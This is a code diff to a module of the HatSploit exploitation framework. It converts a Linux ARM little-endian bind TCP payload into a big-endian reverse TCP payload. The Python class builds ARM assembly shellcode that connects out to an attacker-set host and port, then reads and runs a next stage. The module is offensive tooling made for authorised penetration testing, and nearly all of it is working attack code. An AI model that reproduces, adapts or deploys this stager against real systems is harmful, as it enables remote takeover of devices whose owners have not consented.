@@ -9,23 +9,23 @@ from hatsploit.lib.core.payload.basic import *
 class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__({
-            'Name': "Linux armle Bind TCP",
-            'Payload': "linux/armle/bind_tcp",
+            'Name': "Linux armbe Reverse TCP",
+            'Payload': "linux/armbe/reverse_tcp",
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
             'Description': (
-                "This payload creates an interactive bind TCP connection for Linux "
-                "with ARM little-endian architecture and reads next phase."
+                "This payload creates an interactive reverse TCP connection for Linux "
+                "with ARM big-endian architecture and reads next stage."
             ),
-            'Arch': ARCH_ARMLE,
+            'Arch': ARCH_ARMBE,
             'Platform': OS_LINUX,
-            'Type': BIND_TCP,
+            'Type': REVERSE_TCP,
         })
 
-        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
+        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                       False, advanced=True)
-        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
+        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                     False, advanced=True)
 
     def run(self):
@@ -46,7 +46,7 @@ class HatSploitPayload(Payload, Handler):
 
         assembly += """
             mov ip, r0
-            add r7, 1
+            add r7, 2
             adr r1, addr
             mov r2, 16
             svc 0
@@ -58,36 +58,8 @@ class HatSploitPayload(Payload, Handler):
                 blt fail
             """
 
-        assembly += """
-            mov r0, ip
-            mov r1, 2
-            add r7, 2
-            svc 0
-        """
-
-        if self.reliable.value:
-            assembly += """
-                cmp r0, 0
-                blt fail
-            """
-
-        assembly += """
-            mov r0, ip
-            eor r1, r1
-            eor r2, r2
-            add r7, 1
-            svc 0
-        """
-
-        if self.reliable.value:
-            assembly += """
-                cmp r0, 0
-                blt fail
-            """
-
         if self.length.value:
             assembly += f"""
-                mov ip, r0
                 sub sp, 4
                 mov r0, {hex(self.length.value)}
                 push {{r0}}
@@ -95,10 +67,9 @@ class HatSploitPayload(Payload, Handler):
 
         else:
             assembly += f"""
-                mov ip, r0
                 mov r0, ip
                 sub sp, 4
-                add r7, 6
+                add r7, 8
                 mov r1, sp
                 mov r2, 4
                 mov r3, 0
@@ -186,8 +157,8 @@ class HatSploitPayload(Payload, Handler):
         assembly += f"""
         addr:
             .short 0x2
-            .short 0x{self.rport.little.hex()}
-            .word 0x0
+            .short 0x{self.rport.big.hex()}
+            .word 0x{self.rhost.big.hex()}
         """
 
-        return self.assemble(assembly)
+        return self.__asm__(assembly)
